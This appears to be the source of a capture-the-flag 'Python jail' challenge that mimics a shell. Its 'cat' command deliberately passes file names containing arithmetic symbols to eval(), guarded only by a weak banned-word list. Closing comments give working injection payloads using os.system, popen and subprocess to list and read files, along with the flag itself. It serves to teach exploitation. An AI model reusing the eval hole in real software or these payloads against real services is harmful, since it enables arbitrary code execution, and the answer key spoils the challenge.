import time,random 

banned = 'buildin|sy|o|s|+|-|*|/|{|}|subprocess|pty|popen|read|open|write' 
banned_list = banned.split('|')
def boot():
	print("BOOTING.....")
	time.sleep(1)
	print("BUBUBU 6.69.66-kcsc-devtest")
	print("This message only show one a day, currently we don't have any feature to turn this off")
	print("For more information, please visit https://kcsc-club.github.io")
	print("Press any key to continue....")
	input()
	print("\n\n")

def not_found(name):
	print(name,": command not found")

def ls():
	print("hints\tsupersecret.txt\tflag.zip")

def cd(user_input):
	print(user_input,": command not found")
	print("Please apt-get update to install this feature")

def hint():
	print("500k momo: 0123456789")

def supersecret():
	print("Co lam thi moi co an. Khong lam....")
	time.sleep(1)
	print("[process exited with code 3405691582 (0xcafebabe)]")
	exit()

def flagzip():
	for i in range(0,1000):
		print(chr(random.randint(0,255)),end="")
	print()

def cat(s):
	if len(s) == 3:
		print(s,":missing operand")
	command = s.split()[0]
	if command != 'cat':
		return not_found(command)

	file_name = ' '.join(s.split()[1:])
	if any(char in ['+', '-', '*', '/'] for char in file_name):
		file_name = eval(file_name)

	if file_name == 'hints':
		hint()
	elif file_name == 'supersecret.txt':
		supersecret()
	elif file_name == 'flag.zip':
		flagzip()
	else:
		print("cat: ",file_name,": No such file or directory")

def check(s):
	if len(s) > 55 :
		return False
	if s in banned_list:
		return False
	return True

def begin():
	while True:
		print("user@BUBUBU: ",end="")
		user_input = input()
		if (check(user_input)):
			if 'ls' == user_input:
				ls()
			elif 'cat' in user_input:
				cat(user_input)	
			elif 'cd' in user_input:
				cd(user_input)
			else:
				not_found(user_input)
		else :
			print("[process exited with code 3735928559 (0xdeadbeef)]")
			exit()

if __name__ == "__main__":
	boot()
	begin()
# cat + __import__('subprocess').check_output(r'ls -la',shell=True)
# cat + __import__('os').popen(r'ls -la').read()
# cat + __import__('os').system('ls -la')
# cat + __import__('os').system('cat /home/jail/flag.txt') len > 50
# cat + __import__('os').system('cat ~/flag.txt')
# KCSC{y0u_c@n_3scaps3_thE_MaTr1x}
# https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html
# https://vk9-sec.com/exploiting-python-eval-code-injection/